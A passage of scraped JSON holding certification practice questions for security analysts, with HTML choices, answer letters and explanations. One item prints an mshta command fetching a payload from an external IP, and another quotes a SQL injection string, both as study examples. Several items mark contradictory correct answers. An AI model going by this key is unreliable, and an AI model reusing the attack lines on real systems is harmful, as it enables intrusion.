ulti-choice-letter\" data-choice-letter=\"B\">B.&nbsp;</span>Software development life cycle (SDLC)</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"C\">C.&nbsp;</span>Open Systems Interconnection (OSI) model</li><li class=\"multi-choice-item correct-hidden\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"D\">D.&nbsp;</span>Cyber Kill Chain</li></ul></div><!--EndFragment-->","correct":"D","explanation":"The Cyber Kill Chain helps security teams understand the different stages an attacker may use to compromise an environment. By mapping potential attack paths, analysts can identify areas of exposure and the environment's attack surface."},{"number":528,"content":"<!--StartFragment--><p class=\"card-text\" style=\"margin: 0px 0px 26px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\">A security operations center analyst must determine which threat actor is targeting their industry based on similar attack vectors. Which of the following provides the best intelligence for attribution?</p><div class=\"question-choices-container\" style=\"margin: 8px 0px 20px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\"><ul style=\"margin: 0px; list-style: outside none none; padding: 0px;\"><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"A\">A.&nbsp;</span>AbuseIPDB</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"B\">B.&nbsp;</span>Spoofing, tampering, repudiation, information disclosure, denial of service, and elevation of privilege</li><li class=\"multi-choice-item correct-hidden\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"C\">C.&nbsp;</span>Tactics, techniques, and procedures</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"D\">D.&nbsp;</span>Internet Protocols</li></ul></div><!--EndFragment-->","correct":"C","explanation":"TTPs provide the best intelligence for threat actor attribution because attackers tend to have recognizable patterns in how they conduct operations.\n\nFor example, an actor may consistently use:\n\nSpecific phishing techniques\nParticular malware/exploitation methods\nCertain persistence mechanisms\nSpecific command-and-control techniques\nCharacteristic lateral-movement methods"},{"number":529,"content":"<!--StartFragment--><p class=\"card-text\" style=\"margin: 0px 0px 26px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\">An analyst is assigned to a new cybersecurity improvement project. The analyst wants to better understand the workflow processes and the skill set of the cybersecurity engineers on this task force. The analyst sets up a recurring, weekly conference call. Which of the following best describes the purpose for the conference call?</p><div class=\"question-choices-container\" style=\"margin: 8px 0px 20px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\"><ul style=\"margin: 0px; list-style: outside none none; padding: 0px;\"><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"A\">A.&nbsp;</span>To conduct incident response training</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"B\">B.&nbsp;</span>To create vendor information sessions</li><li class=\"multi-choice-item correct-hidden\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"C\">C.&nbsp;</span>To manage and facilitate team coordination</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"D\">D.&nbsp;</span>To respond to customer requirements</li></ul></div><!--EndFragment-->","correct":"C","explanation":"The key clues are:\n\nNew cybersecurity improvement project\nWants to understand the team's workflow processes and skill sets\nSets up a recurring weekly conference call\n\nThis is primarily about coordinating the team, understanding responsibilities, sharing updates, and ensuring everyone is aligned."},{"number":530,"content":"<!--StartFragment--><p class=\"card-text\" style=\"margin: 0px 0px 26px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\">Which of the following is a reason why a SOC team member might spend extra time on a routine incident prior to closing it?</p><div class=\"question-choices-container\" style=\"margin: 8px 0px 20px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\"><ul style=\"margin: 0px; list-style: outside none none; padding: 0px;\"><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"A\">A.&nbsp;</span>To allow another team member to manage more tickets</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"B\">B.&nbsp;</span>To increase the mean time to respond metric</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"C\">C.&nbsp;</span>To write a report classifying the incident within the MITRE ATT&amp;CK framework</li><li class=\"multi-choice-item correct-hidden\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"D\">D.&nbsp;</span>To create an automated process for handling it the next time</li></ul></div><!--EndFragment-->","correct":"C","explanation":""},{"number":531,"content":"<!--StartFragment--><p class=\"card-text\" style=\"margin: 0px 0px 26px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\">An analyst receives the following summary report for vulnerabilities on multiple hosts:<br><br><img src=\"https://img.examtopics.com/cs0-003/image122.png\" style=\"vertical-align: middle; border-style: none;\"><br><br>Which of the following servers should the analyst remediate first?</p><div class=\"question-choices-container\" style=\"margin: 8px 0px 20px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\"><ul style=\"margin: 0px; list-style: outside none none; padding: 0px;\"><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"A\">A.&nbsp;</span>COMPTIA-WEB01</li><li class=\"multi-choice-item correct-hidden\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"B\">B.&nbsp;</span>COMPTIA-APP01</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"C\">C.&nbsp;</span>COMPTIA-FS01</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"D\">D.&nbsp;</span>COMPTIA-DC01</li></ul></div><!--EndFragment-->","correct":"D","explanation":"The Domain Controller is the highest-value target. Even a smaller number of critical vulnerabilities on a Domain Controller generally presents a greater organizational risk than more vulnerabilities on a less critical server."},{"number":532,"content":"<!--StartFragment--><p class=\"card-text\" style=\"margin: 0px 0px 26px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\">An incident response team identifies a malicious uniform resource locator (URL) associated with a required business process and performs the following activities:<br><br>• Access to the URL has been restricted only to the necessary users through firewall rules and Cloud Security Group rules.<br>• Additional monitoring has been enabled for traffic related to that site and the allowed users.<br>• All application servers that need to access that site have been patched with the latest security and software updates.<br>• Application owners have been notified of the severity and need to remediate this reported issue.<br><br>Which of the following best describes the overall mitigation the security team is performing?</p><div class=\"question-choices-container\" style=\"margin: 8px 0px 20px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\"><ul style=\"margin: 0px; list-style: outside none none; padding: 0px;\"><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"A\">A.&nbsp;</span>Patching solutions</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"B\">B.&nbsp;</span>Configuration management</li><li class=\"multi-choice-item correct-hidden\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"C\">C.&nbsp;</span>Compensating controls</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"D\">D.&nbsp;</span>Attack surface management</li></ul></div><!--EndFragment-->","correct":"C","explanation":"The key clue is that the malicious URL is still required for business, so the security team can't simply remove access.\n\nInstead, they're applying additional security controls to reduce the risk, such as:\n\nRestricting access to only necessary users\nFirewall and cloud security group rules\nAdditional monitoring\nPatching affected application servers\nNotifying application owners for remediation\n\nThese measures compensate for the underlying security issue while the required business functionality remains available."},{"number":533,"content":"<!--StartFragment--><p class=\"card-text\" style=\"margin: 0px 0px 26px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\">A compliance analyst works with a management team to develop remediation plans following a recent red-team assessment of the organization's operational technology (OT) networks within an industrial facility. While the backbone of the OT network is based on modern, fully supported infrastructure, the OT components are outdated and vulnerable to a variety of attacks. Further mitigation is not possible from a logical controls perspective. Which of the following approaches is best for the organization to consider for ongoing risk mitigation efforts?</p><div class=\"question-choices-container\" style=\"margin: 8px 0px 20px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\"><ul style=\"margin: 0px; list-style: outside none none; padding: 0px;\"><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"A\">A.&nbsp;</span>Reduced patching requirements for ОТ systems</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"B\">B.&nbsp;</span>Deployment of token-based multifactor authentication (MFA) for all access to industrial systems</li><li class=\"multi-choice-item correct-hidden\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"C\">C.&nbsp;</span>Increased use of network segmentation</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"D\">D.&nbsp;</span>Expansion of cyber insurance coverage</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"E\">E.&nbsp;</span>Enhanced usage of AI to augment existing endpoint detection and response (EDR) solutions</li></ul></div><!--EndFragment-->","correct":"C","explanation":""},{"number":534,"content":"<!--StartFragment--><p class=\"card-text\" style=\"margin: 0px 0px 26px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\">Before merging with a software company, the acquiring company's legal team requires a detailed software scan to determine if all code base is using open-source or paid licensed libraries. The vulnerability management analyst needs to provide this report. Which of the following scan methods will best meet this requirement?</p><div class=\"question-choices-container\" style=\"margin: 8px 0px 20px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\"><ul style=\"margin: 0px; list-style: outside none none; padding: 0px;\"><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"A\">A.&nbsp;</span>Static application security testing (SAST)</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"B\">B.&nbsp;</span>Dynamic application security testing (DAST)</li><li class=\"multi-choice-item correct-hidden\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"C\">C.&nbsp;</span>Software composition analysis (SCA)</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"D\">D.&nbsp;</span>Runtime application self-protection (RASP)</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"E\">E.&nbsp;</span>Credentialed vulnerability scan</li></ul></div><!--EndFragment-->","correct":"C","explanation":"The key phrase is:\n\n“determine if all code base is using open-source or paid licensed libraries.”\n\nThat's exactly what SCA is designed for.\n\nSCA analyzes an application's third-party and open-source components and can identify:\n\nOpen-source libraries\nThird-party dependencies\nVersions\nKnown vulnerabilities\nLicense types and compliance issues\nDependency relationships"},{"number":535,"content":"<!--StartFragment--><p class=\"card-text\" style=\"margin: 0px 0px 26px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\">An analyst is researching potential indicators of compromise (IoCs) on a server and receives the following output:<br><br><img src=\"https://img.examtopics.com/cs0-003/image132.png\" style=\"vertical-align: middle; border-style: none;\"><br><br>Which of following best describes the potential IoC?</p><div class=\"question-choices-container\" style=\"margin: 8px 0px 20px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\"><ul style=\"margin: 0px; list-style: outside none none; padding: 0px;\"><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"A\">A.&nbsp;</span>Enumeration</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"B\">B.&nbsp;</span>Rogue device</li><li class=\"multi-choice-item correct-hidden\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"C\">C.&nbsp;</span>Activity on unexpected ports</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"D\">D.&nbsp;</span>Unauthorized software</li></ul></div><!--EndFragment-->","correct":"C","explanation":"The strongest IoC is the unusual network ports being used by the server.\n\nFor example:\n\n193.8.10.20:666 → TCP/666 is unusual and suspicious.\n168.63.1.29:3256 → nonstandard port.\nMultiple external connections from the server using unusual destination ports.\n\nThis fits the CySA+ IoC category:\n\nNetwork-related IoC → Activity on unexpected ports"},{"number":536,"content":"<!--StartFragment--><p class=\"card-text\" style=\"margin: 0px 0px 26px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\">As part of a malware analysis, a security analyst finds the following:<br><br>mshta https://185.43.143.6/dXNlcjliYWxkbzY4NClwd2Q9RkBuY3lLYXQxLUlQPTIzLjcuNDIuMSlwPTIyODA=<br><br>Which of the following is the best tool to use for additional analysis?</p><div class=\"question-choices-container\" style=\"margin: 8px 0px 20px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\"><ul style=\"margin: 0px; list-style: outside none none; padding: 0px;\"><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"A\">A.&nbsp;</span>Metasploit</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"B\">B.&nbsp;</span>strings</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"C\">C.&nbsp;</span>VirusTotal</li><li class=\"multi-choice-item correct-hidden\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"D\">D.&nbsp;</span>CyberChef</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"E\">E.&nbsp;</span>Wireshark</li></ul></div><!--EndFragment-->","correct":"D","explanation":"The key clue is the encoded-looking string:\n\ndXNlcjliYWxkbzY4NClwd2Q9RkBuY3lLYXQxLUlQPTIzLjcuNDIuMSlwPTIyODA=\n\nThis is Base64-encoded data. CyberChef is ideal for decoding and analyzing encoded data during malware analysis.\n\nIf you Base64-decode it, you get data resembling:\n\nuser9baldo84\\pwd=F@ncyKat1-IP=23.7.42.1p=2280\n\nSo CyberChef would allow the analyst to quickly identify what the encoded portion contains."},{"number":537,"content":"<!--StartFragment--><p class=\"card-text\" style=\"margin: 0px 0px 26px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\">An incident response team investigates a possible data leak. Various IT systems collect evidence. Which of the following processes is required to ensure that evidentiary artifacts are properly recorded?</p><div class=\"question-choices-container\" style=\"margin: 8px 0px 20px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\"><ul style=\"margin: 0px; list-style: outside none none; padding: 0px;\"><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"A\">A.&nbsp;</span>Packaging and labeling</li><li class=\"multi-choice-item correct-hidden\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"B\">B.&nbsp;</span>Chain of custody</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"C\">C.&nbsp;</span>Post incident reporting</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"D\">D.&nbsp;</span>Storage and containment</li></ul></div><!--EndFragment-->","correct":"B","explanation":"Chain of custody ensures that digital evidence is properly documented and tracked from the moment it is collected until it is stored, transferred, analyzed, or presented.\n\nIt records things like:\n\nWho collected the evidence\nWhen and where it was collected\nWho handled it afterward\nWhen it was transferred\nHow it was stored"},{"number":538,"content":"<!--StartFragment--><p class=\"card-text\" style=\"margin: 0px 0px 26px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\">A red-team exercise identifies the following string that was entered in a username field on a web application and caused data exposure:<br><br>‘ or 1=1; select * from users; --<br><br>Which of the following is the best strategy to remediate this issue?</p><div class=\"question-choices-container\" style=\"margin: 8px 0px 20px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\"><ul style=\"margin: 0px; list-style: outside none none; padding: 0px;\"><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"A\">A.&nbsp;</span>Attack surface management</li><li class=\"multi-choice-item correct-hidden\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"B\">B.&nbsp;</span>Secure coding best practices</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"C\">C.&nbsp;</span>Compensating controls</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"D\">D.&nbsp;</span>Patching and configuration management</li></ul></div><!--EndFragment-->","correct":"B","explanation":"The input:\n\n' or 1=1; select * from users; --\n\nis a classic SQL injection (SQLi) payload. It manipulates a SQL query through user input and can expose database information.\n\nThe best remediation is to fix the application's code using secure coding practices, such as:\n\nParameterized queries / prepared statements\nInput validation\nProper output encoding where applicable\nAvoiding dynamically constructed SQL queries\nLeast-privilege database accounts"},{"number":539,"content":"<!--StartFragment--><p class=\"card-text\" style=\"margin: 0px 0px 26px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\">Several devices are added to a business network. Some of the new devices do not generate traffic during business hours. Which of the following scanning methods is the best way to identify the risk?</p><div class=\"question-choices-container\" style=\"margin: 8px 0px 20px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\"><ul style=\"margin: 0px; list-style: outside none none; padding: 0px;\"><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"A\">A.&nbsp;</span>Passive</li><li class=\"multi-choice-item correct-hidden\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"B\">B.&nbsp;</span>Active</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"C\">C.&nbsp;</span>Mapping</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"D\">D.&nbsp;</span>Agentless</li></ul></div><!--EndFragment-->","correct":"A","explanation":"“Some of the new devices do not generate traffic during business hours.”\n\nA passive scan/discovery monitors existing network traffic to identify devices without actively probing them.\n\nHowever, there's an important nuance: if a device generates no traffic, passive monitoring may not detect it. But among these choices, passive is the intended answer when the goal is to identify devices without actively interacting with them."},{"number":540,"content":"<!--StartFragment--><p class=\"card-text\" style=\"margin: 0px 0px 26px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\">Current playbooks for incident response mention resources that have been decommissioned. Which of the following actions should an analyst take?</p><div class=\"question-choices-container\" style=\"margin: 8px 0px 20px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\"><ul style=\"margin: 0px; list-style: outside none none; padding: 0px;\"><li class=\"multi-choice-item correct-hidden\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"A\">A.&nbsp;</span>Schedule a meeting with the responsible team for a policy review</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"B\">B.&nbsp;</span>Create an automation script to archive unused playbooks.</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"C\">C.&nbsp;</span>Begin an asset inventory review with the appropriate team.</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"D\">D.&nbsp;</span>Rewrite all threat response playbooks.</li></ul></div><!--EndFragment-->","correct":"C","explanation":"The key clue is:\n\n“Playbooks mention resources that have been decommissioned.”\n\nThis indicates the incident-response documentation is out of date because the asset inventory has changed."},{"number":541,"content":"<!--StartFragment--><p class=\"card-text\" style=\"margin: 0px 0px 26px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\">A Chief Information Security Officer wants to map all of the attack vectors that the company faces each day. Which of the following recommendations should the company align its security controls around?</p><div class=\"question-choices-container\" style=\"margin: 8px 0px 20px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\"><ul style=\"margin: 0px; list-style: outside none none; padding: 0px;\"><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"A\">A.&nbsp;</span>OSSTMM</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"B\">B.&nbsp;</span>Diamond Model of Intrusion Analysis</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"C\">C.&nbsp;</span>ОWASP</li><li class=\"multi-choice-item correct-hidden\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"D\">D.&nbsp;</span>MITRE ATT&amp;CK</li></ul></div><!--EndFragment-->","correct":"D","explanation":"MITRE ATT&CK is explicitly designed to help organizations understand how attackers operate, what vectors they use, and how to align defenses accordingly."},{"number":542,"content":"<!--StartFragment--><p class=\"card-text\" style=\"margin: 0px 0px 26px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\">Which of the following best describes the action a technical team should take during the containment phase of a security breach?</p><div class=\"question-choices-container\" style=\"margin: 8px 0px 20px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\"><ul style=\"margin: 0px; list-style: outside none none; padding: 0px;\"><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"A\">A.&nbsp;</span>Make vulnerability scan reports available to the appropriate teams.</li><li class=\"multi-choice-item correct-hidden\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"B\">B.&nbsp;</span>Create automation scripts for immediate isolation.</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"C\">C.&nbsp;</span>Maintain a reliable patch management solution.</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"D\">D.&nbsp;</span>Specify clear and defined incident response roles.</li></ul></div><!--EndFragment-->","correct":"B","explanation":"During the containment phase, the goal is to limit the spread and impact of the incident.\n\nAutomation can allow the technical team to quickly:\n\nIsolate compromised endpoints\nBlock malicious IPs/domains\nDisable compromised accounts\nQuarantine affected systems"},{"number":543,"content":"<!--StartFragment--><p class=\"card-text\" style=\"margin: 0px 0px 26px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\">Based on recent alerts, a security analyst thinks a web application server was compromised. The analyst reviews the following server output:<br><br><img src=\"https://img.examtopics.com/cs0-003/image133.png\" style=\"vertical-align: middle; border-style: none;\"><br><br>Which of the following best describes what has occurred?</p><div class=\"question-choices-container\" style=\"margin: 8px 0px 20px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\"><ul style=\"margin: 0px; list-style: outside none none; padding: 0px;\"><li class=\"multi-choice-item correct-hidden\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"A\">A.&nbsp;</span>An initiated unauthorized session</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"B\">B.&nbsp;</span>Too many users logged in at the same time</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"C\">C.&nbsp;</span>High resource consumption</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"D\">D.&nbsp;</span>Abnormal idle times for each user</li></ul></div><!--EndFragment-->","correct":"A","explanation":"The key clue is the FROM column:\n\n89.123.222.5\n\nThe user wwW has an active session originating from an external IP address. On a web application server, an unexpected interactive user session is suspicious and can indicate unauthorized access.\n\nWhy not the others?"},{"number":544,"content":"<!--StartFragment--><p class=\"card-text\" style=\"margin: 0px 0px 26px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\">An incident response manager conducts a tabletop exercise. Which of the following steps should the incident response manager take next?</p><div class=\"question-choices-container\" style=\"margin: 8px 0px 20px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\"><ul style=\"margin: 0px; list-style: outside none none; padding: 0px;\"><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"A\">A.&nbsp;</span>Containment</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"B\">B.&nbsp;</span>Response</li><li class=\"multi-choice-item correct-hidden\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"C\">C.&nbsp;</span>Lessons learned</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"D\">D.&nbsp;</span>Root cause analysis</li></ul></div><!--EndFragment-->","correct":"C","explanation":"A tabletop exercise is a simulated incident-response exercise, not a real incident.\n\nAfter the exercise, the team should conduct a lessons-learned review to identify:\n\nWhat worked\nWhat didn't work\nGaps in the incident response plan\nImprovements needed\nTraining or process changes"},{"number":545,"content":"<!--StartFragment--><p class=\"card-text\" style=\"margin: 0px 0px 26px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\">Which of the following is the best reason to heavily segment business-critical assets from within the network?</p><div class=\"question-choices-container\" style=\"margin: 8px 0px 20px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\"><ul style=\"margin: 0px; list-style: outside none none; padding: 0px;\"><li class=\"multi-choice-item correct-hidden\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"A\">A.&nbsp;</span>Legacy systems</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"B\">B.&nbsp;</span>Degraded functionality</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"C\">C.&nbsp;</span>Asset obfuscation</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"D\">D.&nbsp;</span>Proprietary server</li></ul></div><!--EndFragment-->","correct":"A","explanation":"Legacy systems are often difficult or impossible to patch, upgrade, or replace, making them more vulnerable to compromise. Heavily segmenting them helps contain an attack and prevent lateral movement to critical assets."},{"number":546,"content":"<!--StartFragment--><p class=\"card-text\" style=\"margin: 0px 0px 26px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\">A security director at a remote company is concerned about recent threat intelligence reports regarding threat actors who are hired by the company and steal intellectual property. Which of the following solutions are the best ways to identify the tactics, techniques, and procedures (TTPs) used by these threat actors? (Choose two.)</p><div class=\"question-choices-container\" style=\"margin: 8px 0px 20px; color: rgb(80, 80, 80); font-family: &quot;Roboto 